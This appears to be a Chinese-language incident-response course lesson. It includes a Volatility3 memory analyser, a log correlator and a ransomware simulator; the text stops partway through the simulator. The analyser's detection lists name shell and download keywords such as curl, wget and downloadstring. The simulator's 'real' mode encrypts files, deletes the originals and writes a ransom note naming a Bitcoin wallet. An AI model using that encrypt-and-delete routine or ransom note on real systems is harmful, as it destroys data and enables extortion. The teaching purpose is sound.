第二节课
深度取证与云环境响应
内存分析、云安全、勒索软件
课程目标
掌握内存取证技术，提取攻击痕迹
实现多源日志关联分析
模拟勒索软件并编写解密工具
使用云API自动化响应
基于YARA的威胁狩猎
动态行为分析沙箱
构建简单SOAR工作流

# 创建虚拟环境
python -m venv ir_env
source ir_env/bin/activate  # Linux/Mac
# ir_env\Scripts\activate   # Windows

# 安装核心依赖
pip install volatility3 yara-python boto3 requests pandas numpy cryptography psutil matplotlib networkx docker

# 验证安装
python -c "import volatility3; print('Volatility3 OK')"
python -c "import yara; print('YARA OK')"
什么是内存取证？
从系统内存（RAM）中提取证据的技术
可以获取：运行进程、网络连接、加密密钥、隐藏代码
常见应用场景：
无文件攻击检测
进程注入分析
加密密钥提取
rootkit检测
Volatility3简介：
开源内存取证框架
支持Windows/Linux/macOS
插件化架构
代码练习：内存分析器

#!/usr/bin/env python3
"""
内存取证分析器 - 完整版
功能：解析内存镜像，检测隐藏进程、代码注入、网络连接
"""

import os
import sys
import json
import subprocess
import re
from datetime import datetime

class MemoryAnalyzer:
    """内存取证分析器"""
    
    def __init__(self, image_path, volatility_path='vol'):
        """
        初始化分析器
        :param image_path: 内存镜像路径
        :param volatility_path: volatility3命令路径
        """
        self.image_path = image_path
        self.volatility = volatility_path
        self.output_dir = f"memory_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.results = {
            'image': image_path,
            'analysis_time': datetime.now().isoformat(),
            'processes': [],
            'connections': [],
            'injections': [],
            'malfind_results': [],
            'cmdline': []
        }
        
        # 创建输出目录
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_volatility(self, plugin, args=''):
        """
        执行volatility命令
        """
        cmd = f"{self.volatility} -f {self.image_path} {plugin} {args}"
        print(f"[*] 执行: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode != 0:
                print(f"[-] 命令失败: {result.stderr}")
                return None
            return result.stdout
        except subprocess.TimeoutExpired:
            print("[-] 命令执行超时")
            return None
        except Exception as e:
            print(f"[-] 执行异常: {e}")
            return None
    
    def get_processes(self):
        """
        获取进程列表 (windows.pstree)
        """
        print("\n[*] 获取进程列表...")
        output = self.run_volatility("windows.pstree.PsTree")
        
        if not output:
            return
        
        # 保存原始输出
        with open(f"{self.output_dir}/pstree.txt", 'w') as f:
            f.write(output)
        
        # 解析进程信息
        processes = []
        lines = output.split('\n')
        
        for line in lines:
            # 匹配进程行: 偏移量 进程名 PID PPID ...
            match = re.search(r'([0-9a-fx]+)\s+(\S+\.exe)\s+(\d+)\s+(\d+)', line, re.I)
            if match:
                proc = {
                    'offset': match.group(1),
                    'name': match.group(2),
                    'pid': int(match.group(3)),
                    'ppid': int(match.group(4))
                }
                processes.append(proc)
                
                # 检测可疑进程名
                suspicious_names = ['cmd.exe', 'powershell.exe', 'wscript.exe', 
                                   'cscript.exe', 'mshta.exe', 'regsvr32.exe']
                if proc['name'].lower() in suspicious_names:
                    print(f"  [!] 可疑进程: {proc['name']} (PID: {proc['pid']})")
        
        self.results['processes'] = processes
        print(f"[+] 发现 {len(processes)} 个进程")
        return processes
    
    def get_connections(self):
        """
        获取网络连接 (windows.netscan)
        """
        print("\n[*] 获取网络连接...")
        output = self.run_volatility("windows.netscan.NetScan")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/netscan.txt", 'w') as f:
            f.write(output)
        
        connections = []
        lines = output.split('\n')
        
        for line in lines:
            # 匹配TCP/UDP连接
            if 'TCP' in line or 'UDP' in line:
                parts = line.split()
                if len(parts) >= 6:
                    conn = {
                        'offset': parts[0],
                        'proto': parts[1],
                        'local_addr': parts[2],
                        'remote_addr': parts[3],
                        'state': parts[4] if len(parts) > 4 else '',
                        'pid': parts[5] if len(parts) > 5 else ''
                    }
                    connections.append(conn)
                    
                    # 检测可疑外部连接
                    if conn['remote_addr'] != '-':
                        ip_port = conn['remote_addr'].split(':')
                        if len(ip_port) == 2:
                            ip = ip_port[0]
                            # 检查是否为私有IP
                            if not ip.startswith(('10.', '192.168.', '172.16.', '127.')):
                                print(f"  [!] 外部连接: {conn['proto']} {conn['local_addr']} -> {conn['remote_addr']}")
        
        self.results['connections'] = connections
        print(f"[+] 发现 {len(connections)} 个网络连接")
        return connections
    
    def detect_injection(self):
        """
        检测代码注入 (windows.malfind)
        """
        print("\n[*] 检测代码注入...")
        output = self.run_volatility("windows.malfind.Malfind")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/malfind.txt", 'w') as f:
            f.write(output)
        
        injections = []
        lines = output.split('\n')
        
        for i, line in enumerate(lines):
            # 查找包含MZ或PE头的行（表示可执行代码）
            if 'MZ' in line or 'PE' in line:
                # 向上查找进程信息
                for j in range(max(0, i-5), i):
                    proc_match = re.search(r'Process\s+(\S+)\s+PID:\s+(\d+)', lines[j])
                    if proc_match:
                        injection = {
                            'process': proc_match.group(1),
                            'pid': int(proc_match.group(2)),
                            'address': line.split()[0] if line.split() else '',
                            'indicator': 'MZ' if 'MZ' in line else 'PE'
                        }
                        injections.append(injection)
                        print(f"  [!] 发现注入: {injection['process']} (PID: {injection['pid']}) at {injection['address']}")
                        break
        
        self.results['injections'] = injections
        print(f"[+] 发现 {len(injections)} 个注入痕迹")
        return injections
    
    def get_cmdline(self):
        """
        获取命令行参数 (windows.cmdline)
        """
        print("\n[*] 获取进程命令行...")
        output = self.run_volatility("windows.cmdline.CmdLine")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/cmdline.txt", 'w') as f:
            f.write(output)
        
        cmdlines = []
        lines = output.split('\n')
        
        for line in lines:
            match = re.search(r'(\S+\.exe)\s+pid:\s+(\d+)\s+(.*)', line, re.I)
            if match:
                cmd = {
                    'process': match.group(1),
                    'pid': int(match.group(2)),
                    'cmdline': match.group(3)
                }
                cmdlines.append(cmd)
                
                # 检测可疑命令行
                suspicious_args = ['-enc', '-e ', 'hidden', 'bypass', 'downloadstring',
                                  'invoke-expression', 'wget', 'curl']
                for arg in suspicious_args:
                    if arg in cmd['cmdline'].lower():
                        print(f"  [!] 可疑命令行: {cmd['process']} {cmd['cmdline'][:100]}")
                        break
        
        self.results['cmdline'] = cmdlines
        print(f"[+] 获取 {len(cmdlines)} 个命令行")
        return cmdlines
    
    def dump_process(self, pid):
        """
        转储指定进程的内存
        """
        print(f"\n[*] 转储进程 PID: {pid}")
        output = self.run_volatility(f"windows.memmap.Memmap --pid {pid} --dump")
        
        if output:
            print(f"[+] 进程转储完成")
        return output
    
    def generate_report(self):
        """
        生成分析报告
        """
        report_path = f"{self.output_dir}/analysis_report.json"
        
        # 计算风险评分
        risk_score = 0
        risk_score += len(self.results['injections']) * 30
        risk_score += sum(1 for p in self.results['processes'] 
                         if p['name'].lower() in ['cmd.exe', 'powershell.exe']) * 10
        risk_score += len([c for c in self.results['connections'] 
                          if c['remote_addr'] != '-' and not c['remote_addr'].startswith('127.')]) * 5
        
        self.results['risk_score'] = min(risk_score, 100)
        self.results['risk_level'] = '高危' if risk_score > 70 else '中危' if risk_score > 30 else '低危'
        
        # 保存JSON报告
        with open(report_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        # 打印摘要报告
        print("\n" + "="*60)
        print("内存取证分析报告")
        print("="*60)
        print(f"镜像文件: {self.image_path}")
        print(f"分析时间: {self.results['analysis_time']}")
        print(f"风险等级: {self.results['risk_level']} (评分: {self.results['risk_score']})")
        print(f"\n进程总数: {len(self.results['processes'])}")
        print(f"网络连接: {len(self.results['connections'])}")
        print(f"注入检测: {len(self.results['injections'])}")
        print(f"命令行数: {len(self.results['cmdline'])}")
        print(f"\n报告保存: {report_path}")
        
        return self.results

def main():
    """主函数"""
    if len(sys.argv) < 2:
        print("用法: python memory_analyzer.py <内存镜像路径> [--dump PID]")
        sys.exit(1)
    
    image_path = sys.argv[1]
    
    # 创建分析器
    analyzer = MemoryAnalyzer(image_path)
    
    # 执行分析
    analyzer.get_processes()
    analyzer.get_connections()
    analyzer.detect_injection()
    analyzer.get_cmdline()
    
    # 如果指定了转储进程
    if len(sys.argv) == 4 and sys.argv[2] == '--dump':
        analyzer.dump_process(int(sys.argv[3]))
    
    # 生成报告
    analyzer.generate_report()

if __name__ == '__main__':
    main()
演练任务：
下载测试内存镜像：wget https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples
运行分析器：python memory_analyzer.py win7_memory.dmp
观察输出，识别可疑进程
尝试转储特定进程：python memory_analyzer.py win7_memory.dmp --dump 1234
日志深度挖掘
日志关联的重要性：
单一日志可能看不出攻击
多源日志可以还原完整攻击链
时间轴分析发现因果关系
常见日志类型：
Web访问日志
系统认证日志
防火墙日志
应用日志
数据库日志
关联技术：
时间窗口关联
源IP关联
会话ID关联
行为模式匹配
代码练习：日志关联分析器

#!/usr/bin/env python3
"""
日志关联分析器 - 完整版
功能：合并多种日志，按时间排序，识别攻击模式
"""

import os
import re
import glob
import json
import pandas as pd
from datetime import datetime, timedelta
from collections import defaultdict
import argparse

class LogCorrelator:
    """日志关联分析器"""
    
    def __init__(self, log_dir='./logs', time_window=5):
        """
        初始化
        :param log_dir: 日志目录
        :param time_window: 时间窗口（分钟）
        """
        self.log_dir = log_dir
        self.time_window = time_window
        self.events = []
        self.suspicious_ips = set()
        self.attack_patterns = []
        
    def parse_apache(self, file_pattern='access.log*'):
        """
        解析Apache访问日志
        格式: IP - - [时间] "方法 路径 协议" 状态码 大小
        """
        print(f"[*] 解析Apache日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 匹配Apache日志格式
                        pattern = r'(\d+\.\d+\.\d+\.\d+).*?\[(.*?)\].*?"(\w+)\s+(\S+)\s+HTTP.*?"\s+(\d+)\s+(\d+)'
                        match = re.search(pattern, line)
                        
                        if match:
                            ip, time_str, method, path, status, size = match.groups()
                            
                            # 解析时间: 10/Oct/2023:13:55:36 +0000
                            time_parts = time_str.split()
                            if time_parts:
                                dt = datetime.strptime(time_parts[0], "%d/%b/%Y:%H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'web_access',
                                    'method': method,
                                    'path': path,
                                    'status': int(status),
                                    'size': int(size),
                                    'raw': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                                
                                # 检测可疑状态码
                                if int(status) >= 400:
                                    self.suspicious_ips.add(ip)
                    except Exception as e:
                        print(f"    解析错误 [{fname}:{line_num}]: {e}")
        
        print(f"    解析完成，获得 {len([e for e in self.events if e['type']=='web_access'])} 条记录")
    
    def parse_auth(self, file_pattern='auth.log*'):
        """
        解析系统认证日志
        """
        print(f"[*] 解析认证日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 匹配失败登录
                        if 'Failed password' in line:
                            pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*?from (\d+\.\d+\.\d+\.\d+)'
                            match = re.search(pattern, line)
                            if match:
                                time_str, ip = match.groups()
                                # 添加年份（假设为当前年）
                                dt = datetime.strptime(f"{datetime.now().year} {time_str}", "%Y %b %d %H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'auth_failure',
                                    'detail': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                                self.suspicious_ips.add(ip)
                        
                        # 匹配成功登录
                        elif 'Accepted password' in line:
                            pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*?from (\d+\.\d+\.\d+\.\d+)'
                            match = re.search(pattern, line)
                            if match:
                                time_str, ip = match.groups()
                                dt = datetime.strptime(f"{datetime.now().year} {time_str}", "%Y %b %d %H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'auth_success',
                                    'detail': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                    
                    except Exception as e:
                        print(f"    解析错误 [{fname}:{line_num}]: {e}")
        
        print(f"    解析完成，获得 {len([e for e in self.events if e['type'].startswith('auth')])} 条记录")
    
    def parse_firewall(self, file_pattern='firewall.log*'):
        """
        解析防火墙日志（模拟）
        """
        print(f"[*] 解析防火墙日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 模拟格式: 时间 动作 协议 源IP 目的IP 端口
                        parts = line.strip().split()
                        if len(parts) >= 6:
                            dt = datetime.strptime(parts[0], "%Y-%m-%d %H:%M:%S")
                            event = {
                                'timestamp': dt,
                                'source_ip': parts[3],
                                'dest_ip': parts[4],
                                'type': 'firewall_' + parts[1].lower(),
                                'protocol': parts[2],
                                'port': parts[5],
                                'raw': line.strip(),
                                'source_file': fname
                            }
                            self.events.append(event)
                    except:
                        pass
    
    def correlate(self):
        """
        执行关联分析
        """
        if not self.events:
            print("[-] 无事件可分析")
            return
        
        print("\n" + "="*60)
        print("日志关联分析")
        print("="*60)
        
        # 转换为DataFrame便于分析
        df = pd.DataFrame(self.events)
        df = df.sort_values('timestamp')
        
        # 保存排序后的事件
        df.to_csv('sorted_events.csv', index=False)
        print(f"[+] 事件已保存: sorted_events.csv ({len(df)} 条)")
        
        # 1. 统计每个IP的事件数
        print("\n[1] 可疑IP统计")
        ip_stats = df.groupby('source_ip').size().sort_values(ascending=False)
        for ip, count in ip_stats.head(10).items():
            print(f"  {ip}: {count} 次事件")
        
        # 2. 检测暴力破解
        print("\n[2] 暴力破解检测")
        for ip in ip_stats.index[:20]:  # 检查前20个IP
            ip_events = df[df['source_ip'] == ip].sort_values('timestamp')
            
            # 统计失败登录
            failures = ip_events[ip_events['type'] == 'auth_failure']
            successes = ip_events[ip_events['type'] == 'auth_success']
            
            if len(failures) > 5:
                pattern = {
                    'ip': ip,
                    'failure_count': len(failures),
                    'first_fail': failures.iloc[0]['timestamp'],
                    'last_fail': failures.iloc[-1]['timestamp'],
                    'duration': (failures.iloc[-1]['timestamp'] - failures.iloc[0]['timestamp']).total_seconds() / 60
                }
                
                # 检查是否有成功登录
                if len(successes) > 0:
                    pattern['success_time'] = successes.iloc[0]['timestamp']
                    pattern['attack_success'] = True
                    print(f"  [!] 爆破成功: {ip} - {len(failures)}次失败后成功")
                else:
                    pattern['attack_success'] = False
                    print(f"  [*] 爆破尝试: {ip} - {len(failures)}次失败")
                
                self.attack_patterns.append(pattern)
        
        # 3. 检测Web扫描
        print("\n[3] Web扫描检测")
        web_events = df[df['type'] == 'web_access']
        
        for ip in ip_stats.index[:20]:
            ip_web = web_events[web_events['source_ip'] == ip]
            if len(ip_web) > 50:  # 大量请求
                unique_paths = ip_web['path'].nunique()
                error_rate = len(ip_web[ip_web['status'] >= 400]) / len(ip_web)
                
                if error_rate > 0.3 or unique_paths > 20:
                    print(f"  [!] Web扫描: {ip} - {len(ip_web)}请求, {unique_paths}路径, 错误率{error_rate:.1%}")
        
        # 4. 时间轴关联 - 查找攻击链
        print("\n[4] 攻击链分析")
        for ip in [p['ip'] for p in self.attack_patterns if p.get('attack_success')]:
            ip_events = df[df['source_ip'] == ip].sort_values('timestamp')
            
            print(f"\n  攻击者: {ip}")
            for _, event in ip_events.iterrows():
                if event['type'] == 'auth_failure':
                    print(f"    {event['timestamp']} [失败登录]")
                elif event['type'] == 'auth_success':
                    print(f"    {event['timestamp']} [成功登录] *")
                elif event['type'] == 'web_access':
                    if event['status'] >= 400:
                        print(f"    {event['timestamp']} [Web访问] {event['method']} {event['path']} -> {event['status']}")
        
        # 5. 生成关联规则
        self.generate_rules()
        
        return self.attack_patterns
    
    def generate_rules(self):
        """
        生成检测规则
        """
        print("\n[5] 生成检测规则")
        
        rules = []
        
        for pattern in self.attack_patterns:
            if pattern.get('attack_success'):
                rule = f"""
# 检测规则: 针对 {pattern['ip']} 的爆破成功
alert any any -> any any (
    msg: "SSH爆破成功 - {pattern['ip']}";
    flow: established;
    content:"{pattern['ip']}";
    sid:1000001;
    rev:1;
)
"""
                rules.append(rule)
        
        if rules:
            with open('generated_rules.rules', 'w') as f:
                f.write('\n'.join(rules))
            print(f"[+] 已生成 {len(rules)} 条规则: generated_rules.rules")
    
    def generate_report(self):
        """
        生成HTML报告
        """
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>日志关联分析报告</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        h1 {{ color: #333; }}
        .summary {{ background: #f0f0f0; padding: 10px; border-radius: 5px; }}
        .critical {{ color: red; }}
        .warning {{ color: orange; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
    </style>
</head>
<body>
    <h1>日志关联分析报告</h1>
    <div class="summary">
        <p>分析时间: {datetime.now()}</p>
        <p>日志目录: {self.log_dir}</p>
        <p>总事件数: {len(self.events)}</p>
        <p>攻击模式: {len(self.attack_patterns)}</p>
    </div>
    
    <h2>攻击模式</h2>
    <table>
        <tr>
            <th>IP地址</th>
            <th>失败次数</th>
            <th>成功登录</th>
            <th>持续时间(分钟)</th>
        </tr>
"""
        for pattern in self.attack_patterns:
            html += f"""
        <tr>
            <td>{pattern['ip']}</td>
            <td>{pattern['failure_count']}</td>
            <td class="{'critical' if pattern.get('attack_success') else ''}">{pattern.get('attack_success', False)}</td>
            <td>{pattern.get('duration', 0):.1f}</td>
        </tr>
"""
        
        html += """
    </table>
</body>
</html>
"""
        
        with open('log_analysis_report.html', 'w') as f:
            f.write(html)
        print("[+] HTML报告已生成: log_analysis_report.html")

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='日志关联分析器')
    parser.add_argument('--log-dir', default='./logs', help='日志目录')
    parser.add_argument('--window', type=int, default=5, help='时间窗口（分钟）')
    args = parser.parse_args()
    
    # 创建分析器
    correlator = LogCorrelator(log_dir=args.log_dir, time_window=args.window)
    
    # 解析各种日志
    correlator.parse_apache()
    correlator.parse_auth()
    correlator.parse_firewall()
    
    # 执行关联分析
    correlator.correlate()
    
    # 生成报告
    correlator.generate_report()

if __name__ == '__main__':
    main()
演练任务：
准备测试日志文件（可手动创建或下载示例）
运行分析器：python log_correlator.py --log-dir ./test_logs
分析输出的HTML报告
尝试添加新的日志解析器（如Windows事件日志）
勒索软件工作原理：
文件加密：对称加密（快） + 非对称加密（安全）
密钥管理：生成会话密钥，用公钥加密
赎金提示：留下README文件
应急响应流程：
隔离主机，防止扩散
保存加密文件副本
分析加密方式
尝试解密（如果有漏洞）
从备份恢复
常见加密算法：
AES (对称)
RSA (非对称)
XOR (简单勒索软件)
勒索软件模拟与解密

#!/usr/bin/env python3
"""
勒索软件模拟与解密工具 - 完整版
警告：仅在隔离测试环境中运行！
"""

import os
import sys
import argparse
import json
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import hashlib

# ========== 第一部分：勒索软件模拟 ==========

class RansomwareSimulator:
    """
    勒索软件模拟器（教学用）
    演示文件加密过程和密钥管理
    """
    
    def __init__(self, target_dir='./test_files', mode='simulate'):
        """
        初始化
        :param target_dir: 目标目录
        :param mode: simulate(模拟加密) / real(真实加密)
        """
        self.target_dir = os.path.abspath(target_dir)
        self.mode = mode
        self.key = None
        self.encrypted_files = []
        self.ransom_note = """
        ⚠️ 您的文件已被加密！ ⚠️
        
        所有重要文档、图片、数据库已被AES-256加密。
        
        要恢复文件，请：
        1. 发送 0.1 BTC 到钱包: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
        2. 将您的唯一ID发送到: attacker@example.com
        3. 您将收到解密工具和密钥
        
        您的唯一ID: {victim_id}
        
        不要尝试自行解密，否则文件将永久损坏！
        """
    
    def generate_key(self):
        """生成加密密钥"""
        if self.mode == 'simulate':
            # 模拟模式：使用固定密钥（便于教学）
            self.key = b'simulate_key_1234567890123456'
        else:
            # 真实模式：生成随机密钥
            self.key = Fernet.generate_key()
        
        # 保存密钥（用于演示）
        with open('attackers_key.txt', 'w') as f:
            f.write(self.key.decode() if isinstance(self.key, bytes) else self.key)
        
        return self.key
    
    def setup_test_files(self):
        """创建测试文件"""
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            
            # 创建各种测试文件
            test_files = {
                'document.txt': '这是重要文档内容。\n包含敏感信息。\n密码: admin123',
                'data.csv': 'id,name,value\n1,user1,100\n2,user2,200\n3,user3,300',
                'config.json': '{"database": "localhost", "username": "admin", "password": "secret"}',
                'backup.zip': b'PK\x03\x04\x14\x00\x00\x00\x08\x00' + b'FAKEZIP'*100,
                'image.jpg': b'\xFF\xD8\xFF\xE0' + b'FAKEJPG'*100
            }
            
            for fname, content in test_files.items():
                fpath = os.path.join(self.target_dir, fname)
                if isinstance(content, str):
                    with open(fpath, 'w') as f:
                        f.write(content)
                else:
                    with open(fpath, 'wb') as f:
                        f.write(content)
            
            # 创建子目录
            os.makedirs(os.path.join(self.target_dir, 'subdir'))
            with open(os.path.join(self.target_dir, 'subdir', 'notes.txt'), 'w') as f:
                f.write('子目录中的文件')
        
        print(f"[+] 测试文件已创建: {self.target_dir}")
    
    def encrypt_files(self):
        """加密文件"""
        print(f"\n[*] 开始{'模拟' if self.mode=='simulate' else '真实'}加密...")
        
        # 生成密钥
        key = self.generate_key()
        if isinstance(key, bytes):
            cipher = Fernet(key)
        
        encrypted_count = 0
        skipped_count = 0
        
        # 遍历所有文件
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                # 跳过已加密文件和README
                if file.endswith('.encrypted') or file == 'README.txt':
                    skipped_count += 1
                    continue
                
                try:
                    # 读取文件
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    
                    if self.mode == 'simulate':
                        # 模拟模式：只改后缀，不改内容
                        encrypted_data = data
                    else:
                        # 真实模式：加密内容
                        encrypted_data = cipher.encrypt(data)
                    
                    # 保存加密文件
                    encrypted_path = filepath + '.encrypted'
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted_data)
                    
                    # 删除原文件
                    os.remove(filepath)
                    
                    self.encrypted_files.append({
                        'original': filepath,
                        'encrypted': encrypted_path,
                        'size': len(data)
                    })
                    
                    encrypted_count += 1
                    print(f"    [+] 加密: {os.path.basename(filepath)}")
                    
                except Exception as e:
                    print(f"    [-] 失败 {filepath}: {e}")
        
        # 留下勒索信息
        victim_id = hashlib.md5(self.target_dir.encode()).hexdigest()[:8]
        ransom_content = self.ransom_note.format(victim_id=victim_id)
        
        with open(os.path.join(self.target_dir, 'README.txt'), 'w') as f:
            f.write(ransom_content)
        
        print(f"\n[+] 加密完成!")
        print
